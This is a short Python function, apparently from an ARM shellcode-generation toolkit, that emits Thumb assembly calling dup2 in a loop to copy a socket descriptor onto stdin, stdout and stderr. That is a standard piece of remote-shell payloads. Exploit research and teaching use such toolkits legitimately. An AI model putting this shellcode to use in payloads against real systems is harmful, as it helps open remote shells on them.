def generate(sock=4):
    """Duplicates sock to stdin, stdout and stderr

    Args:
        sock(int/str/reg): sock descriptor

    """
    sc = """
    movs r1, #3
    movs r7, #63
    subs r2, r2, r2
    """
    try:
        xsock = int(sock)
        sc += 'movs r5, #%s' % (xsock)
    except:
        sc += 'movs r5, %s' % (sock)
    sc += """
loop_2:
    movs r0, r5
    subs r1, r1, #1
    svc 1
    cmp r1, r2
    bne loop_2
    """
    return sc
